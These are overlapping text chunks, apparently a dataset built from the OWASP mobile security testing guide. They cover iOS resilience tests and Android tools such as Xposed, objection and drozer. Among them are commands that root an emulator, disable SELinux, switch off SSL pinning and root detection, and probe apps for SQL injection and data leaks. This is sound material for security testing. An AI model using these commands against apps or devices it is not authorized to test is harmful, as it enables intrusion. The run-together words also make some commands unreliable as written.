after other apps from the same vendor are installed and it may change when you update your appbundle’sname. ThereforeitisbesttocombineitwithsomethingintheKeychain. • UsingtheKeychain: YoucanstoresomethingintheKeychaintoidentifytheapplication’sinstance. Tomakesure thatthisdataisnotbackedup,usekSecAttrAccessibleWhenPasscodeSetThisDeviceOnly(ifyouwanttosecure thedataandproperlyenforceapasscodeorTouchIDrequirement),kSecAttrAccessibleAfterFirstUnlockThis- DeviceOnly,orkSecAttrAccessibleWhenUnlockedThisDeviceOnly. • UsingGoogleInstanceID:seetheimplementationforiOShere. Anyschemebasedonthesemethodswillbemoresecurethemomentapasscodeand/orTouchIDisenabled,themate- rials stored in the Keychain or filesystem are protected with protection classes (such as kSecAttrAccessibleAfter- FirstUnlockThisDeviceOnly and kSecAttrAccessibleWhenUnlockedThisDeviceOnly), and the SecAccessControl- CreateFlagsisseteitherwithkSecAccessControlDevicePasscode(forpasscodes),kSecAccessControlUserPresence (passcode, Face ID or Touch ID), kSecAccessControlBiometryAny (Face ID or Touch ID) or kSecAccessControlBiome- tryCurrentSet(FaceID/TouchID:butcurrentenrolledbiometricsonly). Testing for Debugging Code and Verbose Error Logging Platform: ios MASVSV1: MSTG-CODE-4 MASVSV2: MASVS-RESILIENCE-3 516\\nOverview Static Analysis Youcantakethefollowingstaticanalysisapproachfortheloggingstatements: 1. Importtheapplication’scodeintoXcode. 2. Searchthecodeforthefollowingprintingfunctions: NSLog,println,print,dump,debugPrint. 3. Whenyoufindoneofthem,determinewhetherthedevelopersusedawrappingfunctionaroundtheloggingfunction forbettermarkupofthestatementstobelogged;ifso,addthatfunctiontoyoursearch. 4. Foreveryresultofsteps2and3,determinewhethermacrosordebug-staterelatedguardshavebeensettoturn theloggingoffinthereleasebuild. PleasenotethechangeinhowObjective-Ccanusepreprocessormacros: ##ifdefDEBUG //Debug-onlycode ##endif The procedure for enabling this behavior in Swift has changed: you need to either set environment variables in your schemeorsetthemascustomflagsinthetarget’sbuildsettings. Pleasenotethatthefollowingfunctions(whichallow youtodeterminewhethertheappwasbuiltintheSwift2.1. release-configuration)aren’trecommended,asXcode8and Swift3don’tsupportthesefunctions: • _isDebugAssertConfiguration • _isReleaseAssertConfiguration • _isFastAssertConfiguration. Dependingontheapplication’ssetup,theremaybemoreloggingfunctions. Forexample,whenCocoaLumberjackisused, staticanalysisisabitdifferent. Forthe“debug-management”code(whichisbuilt-in): inspectthestoryboardstoseewhetherthereareanyflowsand/or view-controllersthatprovidefunctionalitydifferentfromthefunctionalitytheapplicationshouldsupport. Thisfunctionality canbeanythingfromdebugviewstoprintederrormessages,fromcustomstub-responseconfigurationstologswritten tofilesontheapplication’sfilesystemoraremoteserver. Asadeveloper,incorporatingdebugstatementsintoyourapplication’sdebugversionshouldnotbeaproblemaslongas youmakesurethatthedebugstatementsareneverpresentintheapplication’sreleaseversion. InObjective-C,developerscanusepreprocessormacrostofilteroutdebugcode: ##ifdefDEBUG //Debug-onlycode ##endif InSwift2(withXcode7), youhavetosetcustomcompilerflagsforeverytarget, andcompilerflagshavetostartwith “-D”.SoyoucanusethefollowingannotationswhenthedebugflagDMSTG-DEBUGisset: ##ifMSTG-DEBUG //Debug-onlycode ##endif InSwift3(withXcode8),youcansetActiveCompilationConditionsinBuildsettings/Swiftcompiler-Customflags. Instead ofapreprocessor,Swift3usesconditionalcompilationblocksbasedonthedefinedconditions: ##ifDEBUG_LOGGING //Debug-onlycode ##endif Dynamic Analysis Dynamicanalysisshouldbeexecutedonbothasimulatorandadevicebecausedeveloperssometimesusetarget-based functions(insteadoffunctionsbasedonarelease/debug-mode)toexecutethedebuggingcode. 517\\n1. Runtheapplicationonasimulatorandcheckforoutputintheconsoleduringtheapp’sexecution. 2. AttachadevicetoyourMac,runtheapplicationonthedeviceviaXcode,andcheckforoutputintheconsoleduring theapp’sexecution. Fortheother“manager-based”debugcode: clickthroughtheapplicationonbothasimulatorandadevicetoseeifyou can find any functionality that allows an app’s profiles to be pre-set, allows the actual server to be selected or allows responsesfromtheAPItobeselected. Testing Anti-Debugging Detection Platform: ios MASVSV1: MSTG-RESILIENCE-2 MASVSV2: MASVS-RESILIENCE-4 Overview Inordertotestforanti-debuggingdetectionyoucantrytoattachadebuggertotheappandseewhathappens. Theappshouldrespondinsomeway. Forexampleby: • Alertingtheuserandaskingforacceptingliability. • Preventingexecutionbygracefullyterminating. • Securelywipinganysensitivedatastoredonthedevice. • Reportingtoabackendserver,e.g,forfrauddetection. Trytohookorreverseengineertheappusingthemethodsfromsection“Anti-DebuggingDetection”. Next,workonbypassingthedetectionandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingthedetectioncodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Testing Jailbreak Detection Platform: ios MASVSV1: MSTG-RESILIENCE-1 MASVSV2: MASVS-RESILIENCE-1 Overview Totestforjailbreakdetectioninstalltheapponajailbrokendevice. Launchtheappandseewhathappens: Ifitimplementsjailbreakdetection,youmightnoticeoneofthefollowingthings: • Theappcrashesandclosesimmediately,withoutanynotification. • Apop-upwindowindicatesthattheappwon’trunonajailbrokendevice. Notethatcrashesmightbeanindicatorofjailbreakdetectionbuttheappmaybecrashingforanyotherreasons,e.g.itmay haveabug. Werecommendtotesttheapponnon-jailbrokendevicefirst,especiallywhenyou’retestingpreproduction versions. LaunchtheappandtrytobypassJailbreakDetectionusinganautomatedtool: 518\\nIf it implements jailbreak detection, you might be able to see indicators of that in the output of the tool. See section “AutomatedJailbreakDetectionBypass”. ReverseEngineertheapp: Theappmightbeusingtechniquesthatarenotimplementedintheautomatedtoolsthatyou’veused. Ifthat’sthecase youmustreverseengineertheapptofindproofs. Seesection“ManualJailbreakDetectionBypass”. Testing whether the App is Debuggable Platform: ios MASVSV1: MSTG-CODE-2 MASVSV2: MASVS-RESILIENCE-4 Overview Static Analysis Inspecttheappentitlementsandcheckthevalueofget-task-allowkey. Ifitissettotrue,theappisdebuggable. Usingcodesign: $codesign -d--entitlements -iGoat-Swift.app Executable=/Users/owasp/iGoat-Swift/Payload/iGoat-Swift.app/iGoat-Swift [Dict] [Key]application-identifier [Value] [String]TNAJ496RHB.OWASP.iGoat-Swift [Key]com.apple.developer.team-identifier [Value] [String]TNAJ496RHB [Key]get-task-allow [Value] [Bool]true [Key]keychain-access-groups [Value] [Array] [String]TNAJ496RHB.OWASP.iGoat-Swift Usingldid: $ldid-eiGoat-Swift.app/iGoat-Swift <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC\"-//Apple//DTDPLIST1.0//EN\"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>application-identifier</key> <string>TNAJ496RHB.OWASP.iGoat-Swift</string> <key>com.apple.developer.team-identifier</key> <string>TNAJ496RHB</string> <key>get-task-allow</key> <true/> <key>keychain-access-groups</key> <array> <string>TNAJ496RHB.OWASP.iGoat-Swift</string> </array> </dict> </plist> Dynamic Analysis Checkwhetheryoucanattachadebuggerdirectly, usingXcode. Next, checkifyoucandebugtheapponajailbroken",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 166
    }
  },
  {
    "text": "Inspecttheappentitlementsandcheckthevalueofget-task-allowkey. Ifitissettotrue,theappisdebuggable. Usingcodesign: $codesign -d--entitlements -iGoat-Swift.app Executable=/Users/owasp/iGoat-Swift/Payload/iGoat-Swift.app/iGoat-Swift [Dict] [Key]application-identifier [Value] [String]TNAJ496RHB.OWASP.iGoat-Swift [Key]com.apple.developer.team-identifier [Value] [String]TNAJ496RHB [Key]get-task-allow [Value] [Bool]true [Key]keychain-access-groups [Value] [Array] [String]TNAJ496RHB.OWASP.iGoat-Swift Usingldid: $ldid-eiGoat-Swift.app/iGoat-Swift <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC\"-//Apple//DTDPLIST1.0//EN\"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>application-identifier</key> <string>TNAJ496RHB.OWASP.iGoat-Swift</string> <key>com.apple.developer.team-identifier</key> <string>TNAJ496RHB</string> <key>get-task-allow</key> <true/> <key>keychain-access-groups</key> <array> <string>TNAJ496RHB.OWASP.iGoat-Swift</string> </array> </dict> </plist> Dynamic Analysis Checkwhetheryoucanattachadebuggerdirectly, usingXcode. Next, checkifyoucandebugtheapponajailbroken deviceafterClutchingit. Thisisdoneusingthedebug-serverwhichcomesfromtheBigBossrepositoryatCydia. Note: if the application is equipped with anti-reverse engineering controls, then the debugger can be detected and stopped. 519\\nTesting Obfuscation Platform: ios MASVSV1: MSTG-RESILIENCE-9 MASVSV2: MASVS-RESILIENCE-3 Overview Attempt to disassemble the Mach-O in the IPA and any included library files in the “Frameworks” directory (.dylib or .frameworkfiles),andperformstaticanalysis. Attheveryleast,theapp’scorefunctionality(i.e.,thefunctionalitymeant tobeobfuscated)shouldn’tbeeasilydiscerned. Verifythat: • meaningfulidentifiers,suchasclassnames,methodnames,andvariablenames,havebeendiscarded. • stringresourcesandstringsinbinariesareencrypted. • codeanddatarelatedtotheprotectedfunctionalityisencrypted,packed,orotherwiseconcealed. Foramoredetailedassessment,youneedadetailedunderstandingoftherelevantthreatsandtheobfuscationmethods used. Testing Reverse Engineering Tools Detection Platform: ios MASVSV1: MSTG-RESILIENCE-4 MASVSV2: MASVS-RESILIENCE-4 Overview Launchtheappwithvariousreverseengineeringtoolsandframeworksinstalledonyourtestdevice,suchasFrida,Cydia Substrate,CycriptorSSLKillSwitch. Theappshouldrespondinsomewaytothepresenceofthosetools. Forexampleby: • Alertingtheuserandaskingforacceptingliability. • Preventingexecutionbygracefullyterminating. • Securelywipinganysensitivedatastoredonthedevice. • Reportingtoabackendserver,e.g,forfrauddetection. Next,workonbypassingthedetectionofthereverseengineeringtoolsandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingthedetectioncodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Testing for Debugging Symbols Platform: ios MASVSV1: MSTG-CODE-3 MASVSV2: MASVS-RESILIENCE-3 520\\nOverview Static Analysis To verify the existence of debug symbols you can use objdump from binutils or llvm-objdump to inspect all of the app binaries. InthefollowingsnippetwerunobjdumpoverTargetApp(theiOSmainappexecutable)toshowthetypicaloutputofa binarycontainingdebugsymbolswhicharemarkedwiththed(debug)flag. Checktheobjdumpmanpageforinformation aboutvariousothersymbolflagcharacters. $objdump --syms TargetApp 0000000100007dc8l d *UND*-[ViewController handleSubmitButton:] 000000010000809cl d *UND*-[ViewController touchesBegan:withEvent:] 0000000100008158l d *UND*-[ViewController viewDidLoad] ... 000000010000916cl d *UND*_disable_gdb 00000001000091d8l d *UND*_detect_injected_dylds 00000001000092a4l d *UND*_isDebugged ... Topreventtheinclusionofdebugsymbols,setStrip Debug Symbols During CopytoYESviatheXCodeproject’sbuild settings. Strippingdebuggingsymbolswillnotonlyreducethesizeofthebinarybutalsoincreasethedifficultyofreverse engineering. Dynamic Analysis Dynamicanalysisisnotapplicableforfindingdebuggingsymbols. Testing Emulator Detection Platform: ios MASVSV1: MSTG-RESILIENCE-5 MASVSV2: MASVS-RESILIENCE-1 Overview Inordertotestforemulatordetectionyoucantrytoruntheappondifferentemulatorsasindicatedinsection“Emulator Detection”andseewhathappens. Theappshouldrespondinsomeway. Forexampleby: • Alertingtheuserandaskingforacceptingliability. • Preventingexecutionbygracefullyterminating. • Reportingtoabackendserver,e.g,forfrauddetection. Youcanalsoreverseengineertheappusingideasforstringsandmethodsfromsection“EmulatorDetection”. Next,workonbypassingthisdetectionandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingthedetectioncodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Testing File Integrity Checks 521\\nPlatform: ios MASVSV1: MSTG-RESILIENCE-3,MSTG-RESILIENCE-11 MASVSV2: MASVS-RESILIENCE-2 Overview ApplicationSourceCodeIntegrityChecks: Run the app on the device in an unmodified state and make sure that everything works. Then apply patches to the executableusingoptool,re-signtheappasdescribedinthechapter“iOSTamperingandReverseEngineering”,andrun it. Theappshouldrespondinsomeway. Forexampleby: • Alertingtheuserandaskingforacceptingliability. • Preventingexecutionbygracefullyterminating. • Securelywipinganysensitivedatastoredonthedevice. • Reportingtoabackendserver,e.g,forfrauddetection. Workonbypassingthedefensesandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingthedetectioncodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? FileStorageIntegrityChecks: Gototheappdatadirectoriesasindicatedinsection“AccessingAppDataDirectories”andmodifysomefiles. Next,workonbypassingthedefensesandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,bychangingthecontentsofafileorakey-valuepair)? • HowdifficultisobtainingtheHMACkeyortheasymmetricprivatekey? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Making Sure that the App Is Properly Signed Platform: ios MASVSV1: MSTG-CODE-1 MASVSV2: MASVS-RESILIENCE-2 Overview Static Analysis Youhavetoensurethattheappisusingthelatestcodesignatureformat. Youcanretrievethesigningcertificateinfor- mationfromtheapplication’s.appfilewithcodesign. Codesignisusedtocreate,check,anddisplaycodesignatures,as wellasinquireintothedynamicstatusofsignedcodeinthesystem. Afteryougettheapplication’sIPAfile,re-saveitasaZIPfileanddecompresstheZIPfile. NavigatetothePayloaddirectory, wheretheapplication’s.appfilewillbe. Executethefollowingcodesigncommandtodisplaythesigninginformation: 522\\n$codesign -dvvv YOURAPP.app Executable=/Users/Documents/YOURAPP/Payload/YOURAPP.app/YOURNAME Identifier=com.example.example Format=appbundlewithMach-Ouniversal (armv7arm64) CodeDirectoryv=20200size=154808flags=0x0(none)hashes=4830+5 location=embedded Hashtype=sha256size=32 CandidateCDHashsha1=455758418a5f6a878bb8fdb709ccfca52c0b5b9e CandidateCDHashsha256=fd44efd7d03fb03563b90037f92b6ffff3270c46 Hashchoices=sha1,sha256 CDHash=fd44efd7d03fb03563b90037f92b6ffff3270c46 Signaturesize=4678 Authority=iPhoneDistribution:ExampleLtd Authority=AppleWorldwideDeveloperRelationsCertificationAuthority Authority=AppleRootCA SignedTime=4Aug2017,12:42:52 Info.plistentries=66 TeamIdentifier=8LAMR92KJ8 SealedResourcesversion=2rules=12files=1410 Internalrequirementscount=1size=176 TherearevariouswaystodistributeyourappasdescribedattheAppledocumentation,whichincludeusingtheAppStore orviaAppleBusinessManagerforcustomorin-housedistribution. Incaseofanin-housedistributionscheme,makesure thatnoadhoccertificatesareusedwhentheappissignedfordistribution. 523\\nTesting Tools The OWASP MASTG includes many tools to assist you in executing test cases, allowing you to perform static analysis, dynamic analysis, dynamic instrumentation, etc. These tools are meant to help you conduct your own assessments, rather than provide a conclusive result on an application’s security status. It’s essential to carefully review the tools’ output,asitcancontainbothfalsepositivesandfalsenegatives. The goal of the MASTG is to be as accessible as possible. For this reason, we prioritize including tools that meet the followingcriteria: • Open-source • Freetouse • CapableofanalyzingrecentAndroid/iOSapplications • Regularlyupdated • Strongcommunitysupport Ininstanceswherenosuitableopen-sourcealternativeexists,wemayincludeclosed-sourcetools. However,anyclosed- sourcetoolsincludedmustbefreetouse,asweaimtoavoidfeaturingpaidtoolswheneverpossible. Thisalsoextends tofreewareorcommunityeditionsofcommercialtools. Ourgoalistobevendor-neutralandtoserveasatrustedlearningresource,sothespecificcategoryof“automatedmobile applicationsecurityscanners”presentsauniquechallenge. Forthisreason,wehavehistoricallyavoidedincludingsuch toolsduetothecompetitivedisadvantagestheycancreateamongvendors. Incontrast, weprioritizetoolslikeMobSF thatprovidefullaccesstotheircodeandacomprehensivesetoftests,makingthemexcellentforeducationalpurposes. Toolsthatlackthisleveloftransparency,eveniftheyofferafreeversion,generallydonotmeettheinclusioncriteriaof theOWASPMASproject. Disclaimer: Each tool included in the MASTG examples was verified to be functional at the time it was added. However,thetoolsmaynotworkproperlydependingontheOSversionofbothyourhostcomputerandyourtest device. Thefunctionalityofthetoolscanalsobeaffectedbywhetheryou’reusingarootedorjailbrokendevice,the specific version of the",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 167
    }
  },
  {
    "text": "• Open-source • Freetouse • CapableofanalyzingrecentAndroid/iOSapplications • Regularlyupdated • Strongcommunitysupport Ininstanceswherenosuitableopen-sourcealternativeexists,wemayincludeclosed-sourcetools. However,anyclosed- sourcetoolsincludedmustbefreetouse,asweaimtoavoidfeaturingpaidtoolswheneverpossible. Thisalsoextends tofreewareorcommunityeditionsofcommercialtools. Ourgoalistobevendor-neutralandtoserveasatrustedlearningresource,sothespecificcategoryof“automatedmobile applicationsecurityscanners”presentsauniquechallenge. Forthisreason,wehavehistoricallyavoidedincludingsuch toolsduetothecompetitivedisadvantagestheycancreateamongvendors. Incontrast, weprioritizetoolslikeMobSF thatprovidefullaccesstotheircodeandacomprehensivesetoftests,makingthemexcellentforeducationalpurposes. Toolsthatlackthisleveloftransparency,eveniftheyofferafreeversion,generallydonotmeettheinclusioncriteriaof theOWASPMASproject. Disclaimer: Each tool included in the MASTG examples was verified to be functional at the time it was added. However,thetoolsmaynotworkproperlydependingontheOSversionofbothyourhostcomputerandyourtest device. Thefunctionalityofthetoolscanalsobeaffectedbywhetheryou’reusingarootedorjailbrokendevice,the specific version of the rooting or jailbreaking method, and/or the tool version itself. The OWASP MASTG does not assumeanyresponsibilityfortheoperationalstatusofthesetools. Ifyouencounterabrokentoolorexample,we recommendsearchingonlineforasolutionorcontactingthetool’sproviderdirectly. IfthetoolhasaGitHubpage, youmayalsoopenanissuethere. gplaycli Platform: android Availableat: https://github.com/matlink/gplaycli gplaycliisaPythonbasedCLItooltosearch,installandupdateAndroidapplicationsfromtheGooglePlayStore. Follow the installation steps and you’re ready to run it. gplaycli offers several options, please refer to its help (-h) for more information. Ifyou’reunsureaboutthepackagename(orAppID)ofanapp,youmayperformakeywordbasedsearchforAPKs(-s): $gplaycli -s\"googlekeep\" Title Creator Size LastUpdate AppID Version GoogleKeep -notesandlists GoogleLLC 15.78MB 4Sep2019 com.google.android.keep 193510330 Maps -Navigate & Explore GoogleLLC 35.25MB 16May2019 com.google.android.apps.maps 1016200134 Google GoogleLLC 82.57MB 30Aug2019 com.google.android.googlequicksearchbox 301008048 Notethatregional(GooglePlay)restrictionsapplywhenusinggplaycli. Inordertoaccessappsthatarerestricted inyourcountryyoucanusealternativeappstoressuchastheonesdescribedin“AlternativeAppStores”. Xposed 524\\nPlatform: android Availableat: https://github.com/ElderDrivers/EdXposed Xposed does not work on Android 9 (API level 28). However, it was unofficially ported in 2019 under the name EdXposed,supportingAndroid8-10(APIlevel26till29). YoucanfindthecodeandusageexamplesatEdXposed Githubrepo. Xposedisaframeworkthatallowstomodifythesystemorapplicationaspectandbehavioratruntime,withoutmodifying anyAndroidapplicationpackage(APK)orre-flashing. Technically,itisanextendedversionofZygotethatexportsAPIs for running Java code when a new process is started. Running Java code in the context of the newly instantiated app makesitpossibletoresolve,hook,andoverrideJavamethodsbelongingtotheapp. Xposedusesreflectiontoexamine and modify the running app. Changes are applied in memory and persist only during the process’ runtime since the applicationbinariesarenotmodified. TouseXposed,youneedtofirstinstalltheXposedframeworkonarooteddeviceasexplainedonXDA-DevelopersXposed frameworkhub. ModulescanbeinstalledthroughtheXposedInstallerapp,andtheycanbetoggledonandoffthrough theGUI. Note: given that a plain installation of the Xposed framework is easily detected with SafetyNet, we recommend using MagisktoinstallXposed. Thisway,applicationswithSafetyNetattestationshouldhaveahigherchanceofbeingtestable withXposedmodules. XposedhasbeencomparedtoFrida. WhenyourunFridaserveronarooteddevice,youwillendupwithasimilarlyeffective setup. Both frameworks deliver a lot of value when you want to do dynamic instrumentation. When Frida crashes the app,youcantrysomethingsimilarwithXposed. Next,similartotheabundanceofFridascripts,youcaneasilyuseone ofthemanymodulesthatcomewithXposed, suchastheearlierdiscussedmoduletobypassSSLpinning(JustTrustMe andSSLUnpinning). Xposedincludesothermodules,suchasInspeckagewhichallowyoutodomoreindepthapplication testing as well. On top of that, you can create your own modules as well to patch often used security mechanisms of Androidapplications. Xposedcanalsobeinstalledonanemulatorthroughthefollowingscript: ##!/bin/sh echo \"Startyouremulatorwith'emulator-avdNAMEOFX86A8.0-writable-system-selinuxpermissive-wipe-data'\" adbroot && adbremount adbinstallSuperSU\\v2.79.apk #binarycanbedownloadedfromhttp://www.supersu.com/download adbpushroot_avd-master/SuperSU/x86/su/system/xbin/su adbshellchmod0755/system/xbin/su adbshellsetenforce0 adbshellsu --install adbshellsu --daemon& adbpushbusybox/data/busybox #binarycanbedownloadedfromhttps://busybox.net/ ##adbshell\"mount-oremount,rw/system&&mv/data/busybox/system/bin/busybox&&chmod755/system/bin/busybox&&/system/bin/busybox--install/system/bin\" adbshellchmod755/data/busybox adbshell 'sh-c\"./data/busybox--install/data\"' adbshell 'sh-c\"mkdir/data/xposed\"' adbpushxposed8.zip/data/xposed/xposed.zip #canbedownloadedfromhttps://dl-xda.xposed.info/framework/ adbshellchmod0755/data/xposed adbshell 'sh-c\"./data/unzip/data/xposed/xposed.zip-d/data/xposed/\"' adbshell 'sh-c\"cp/data/xposed/xposed/META-INF/com/google/android/*.*/data/xposed/xposed/\"' echo \"Nowadbshellanddo'su',next:goto./data/xposed/xposed,makeflash-script.shexecutableandrunitinthatdirectoryafter runningSUperSU\" echo \"Next,restartemulator\" echo \"Next,adbinstallXposedInstaller_3.1.5.apk\" echo \"Next,runinstallerandthenadbreboot\" echo \"Wanttouseitagain?Startyouremulatorwith'emulator-avdNAMEOFX86A8.0-writable-system-selinuxpermissive'\" APKiD Platform: android Availableat: https://github.com/rednaga/APKiD APKiDgivesyouinformationabouthowanAPKwasmade. Itidentifiesmanycompilers,packers,obfuscators,andother weirdstuff. Formoreinformationonwhatthistoolcanbeusedfor,checkout: 525\\n• AndroidCompilerFingerprinting • DetectingPiratedandMaliciousAndroidAppswithAPKiD • APKiD:PEiDforAndroidApps • APKiD:FastIdentificationofAppShieldingProducts JustTrustMe Platform: android Availableat: https://github.com/Fuzion24/JustTrustMe AnXposedModuletobypassSSLcertificatepinning-https://github.com/Fuzion24/JustTrustMe objection for Android Platform: android Availableat: https://github.com/sensepost/objection ObjectionoffersseveralfeaturesspecifictoAndroid. Youcanfindthefulllistoffeaturesontheproject’spage,buthere areafewinterestingones: • RepackageapplicationstoincludetheFridagadget • DisableSSLpinningforpopularmethods • Accessapplicationstoragetodownloadoruploadfiles • ExecutecustomFridascripts • ListtheActivities,ServicesandBroadcastreceivers • StartActivities Ifyouhavearooteddevicewithfrida-serverinstalled,ObjectioncanconnectdirectlytotherunningFridaservertoprovide allitsfunctionalitywithoutneedingtorepackagetheapplication. However, itisnotalwayspossibletorootanAndroid deviceortheappmaycontainadvancedRASPcontrolsforrootdetection,soinjectingafrida-gadgetmaybetheeasiest waytobypassthosecontrols. Theabilitytoperformadvanceddynamicanalysisonnon-rooteddevicesisoneofthefeaturesthatmakesObjection incrediblyuseful. Afterfollowingtherepackagingprocessyouwillbeabletorunalltheaforementionedcommandswhich makeitveryeasytoquicklyanalyzeanapplication,orbypassbasicsecuritycontrols. Using Objection on Android Starting up Objection depends on whether you’ve patched the APK or whether you are using a rooted device running Frida-server. ForrunningapatchedAPK,objectionwillautomaticallyfindanyattacheddevicesandsearchforalistening Frida gadget. However, when using frida-server, you need to explicitly tell frida-server which application you want to analyze. ##ConnectingtoapatchedAPK objectionexplore ##Findthecorrectnameusingfrida-ps $frida-ps -Ua|grep -itelegram 30268 Telegram org.telegram.messenger ##ConnectingtotheTelegramappthroughFrida-server $objection --gadget=\"org.telegram.messenger\" explore OnceyouareintheObjectionREPL,youcanexecuteanyoftheavailablecommands. Belowisanoverviewofsomeof themostusefulones: 526\\n##Showthedifferentstoragelocationsbelongingtotheapp $env ##Disablepopularsslpinningmethods $androidsslpinningdisable ##Listitemsinthekeystore $androidkeystorelist ##Trytocircumventrootdetection $androidrootdisable MoreinformationonusingtheObjectionREPLcanbefoundontheObjectionWiki Drozer Platform: android Availableat: https://github.com/FSecureLABS/drozer Drozer is an Android security assessment framework that allows you to search for security vulnerabilities in apps and devicesbyassumingtheroleofathird-partyappinteractingwiththeotherapplication’sIPCendpointsandtheunderlying OS. The advantage of using drozer consists on its ability to automate several tasks and that it can be expanded through modules. Themodulesareveryhelpfulandtheycoverdifferentcategoriesincludingascannercategorythatallowsyou toscanforknowndefectswithasimplecommandsuchasthemodulescanner.provider.injectionwhichdetectsSQL injections in content providers in all",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 168
    }
  },
  {
    "text": "https://github.com/FSecureLABS/drozer Drozer is an Android security assessment framework that allows you to search for security vulnerabilities in apps and devicesbyassumingtheroleofathird-partyappinteractingwiththeotherapplication’sIPCendpointsandtheunderlying OS. The advantage of using drozer consists on its ability to automate several tasks and that it can be expanded through modules. Themodulesareveryhelpfulandtheycoverdifferentcategoriesincludingascannercategorythatallowsyou toscanforknowndefectswithasimplecommandsuchasthemodulescanner.provider.injectionwhichdetectsSQL injections in content providers in all the apps installed in the system. Without drozer, simple tasks such as listing the app’spermissionsrequireseveralstepsthatincludedecompilingtheAPKandmanuallyanalyzingtheresults. Installing Drozer You can refer to drozer GitHub page (for Linux and Windows, for macOS please refer to this blog post) and the drozer websiteforprerequisitesandinstallationinstructions. Using Drozer Beforeyoucanstartusingdrozer,you’llalsoneedthedrozeragentthatrunsontheAndroiddeviceitself. Downloadthe latestdrozeragentfromtheGitHubreleasespageandinstallitwithadb install drozer.apk. OncethesetupiscompletedyoucanstartasessiontoanemulatororadeviceconnectedperUSBbyrunningadbforward tcp:31415 tcp:31415anddrozer console connect. Thisiscalleddirectmodeandyoucanseethefullinstructionsin the User Guide in section “Starting a Session”. An alternative is to run Drozer in infrastructure mode, where, you are runningadrozerserverthatcanhandlemultipleconsolesandagents,androutessessionsbetweenthem. Youcanfind thedetailsofhowtosetupdrozerinthismodeinthe“InfrastructureMode”sectionoftheUserGuide. Nowyouarereadytobeginanalyzingapps. Agoodfirststepistoenumeratetheattacksurfaceofanappwhichcanbe doneeasilywiththefollowingcommand: dz>runapp.package.attacksurface <package> Again, withoutdrozerthiswouldhaverequiredseveralsteps. Themoduleapp.package.attacksurfacelistsactivities, broadcastreceivers,contentprovidersandservicesthatareexported,hence,theyarepublicandcanbeaccessedthrough otherapps. Oncewehaveidentifiedourattacksurface,wecaninteractwiththeIPCendpointsthroughdrozerwithout havingtowriteaseparatestandaloneappasitwouldberequiredforcertaintaskssuchascommunicatingwithacontent provider. Forexample,iftheapphasanexportedActivitythatleakssensitiveinformationwecaninvokeitwiththeDrozermodule app.activity.start: 527\\ndz>runapp.activity.start --component <package><componentname> Thispreviouscommandwillstarttheactivity,hopefullyleakingsomesensitiveinformation. Drozerhasmodulesforevery typeofIPCmechanism. DownloadInsecureBankv2ifyouwouldliketotrythemoduleswithanintentionallyvulnerable applicationthatillustratescommonproblemsrelatedtoIPCendpoints. Paycloseattentiontothemodulesinthescanner category as they are very helpful automatically detecting vulnerabilities even in system packages, specially if you are usingaROMprovidedbyyourcellphonecompany. EvenSQLinjectionvulnerabilitiesinsystempackagesbyGooglehave beenidentifiedinthepastwithdrozer. Other Drozer commands Here’sanon-exhaustivelistofcommandsyoucanusetostartexploringonAndroid: ##Listalltheinstalledpackages $dz>runapp.package.list ##Findthepackagenameofaspecificapp $dz>runapp.package.list -f(stringtobesearched) ##Seebasicinformation $dz>runapp.package.info -a(packagename) ##Identifytheexportedapplicationcomponents $dz>runapp.package.attacksurface (packagename) ##IdentifythelistofexportedActivities $dz>runapp.activity.info -a(packagename) ##LaunchtheexportedActivities $dz>runapp.activity.start --component (packagename)(componentname) ##IdentifythelistofexportedBroadcastreceivers $dz>runapp.broadcast.info -a(packagename) ##SendamessagetoaBroadcastreceiver $dz>runapp.broadcast.send --action (broadcastreceivername)--extra (numberofarguments) ##DetectSQLinjectionsincontentproviders $dz>runscanner.provider.injection -a(packagename) Other Drozer resources Otherresourceswhereyoumightfindusefulinformationare: • OfficialdrozerUserGuide. • drozerGitHubpage • drozerWiki Scrcpy Platform: android Availableat: https://github.com/Genymobile/scrcpy ScrcpyprovidesdisplayandcontrolofAndroiddevicesconnectedoverUSB(orTCP/IP).Itdoesnotrequireanyrootaccess anditworksonGNU/Linux,WindowsandmacOS. Android Studio Platform: android TheofficialIDEforGoogle’sAndroidoperatingsystem,builtonJetBrains’IntelliJIDEAsoftwareanddesignedspecifically forAndroiddevelopment-https://developer.android.com/studio/index.html 528\\nFrida for Android Platform: android FridasupportsinteractionwiththeAndroidJavaruntimethoughtheJavaAPI.You’llbeabletohookandcallbothJavaand nativefunctionsinsidetheprocessanditsnativelibraries. YourJavaScriptsnippetshavefullaccesstomemory,e.g.to readand/orwriteanystructureddata. HerearesometasksthatFridaAPIsoffersandarerelevantorexclusiveonAndroid: • InstantiateJavaobjectsandcallstaticandnon-staticclassmethods(JavaAPI). • 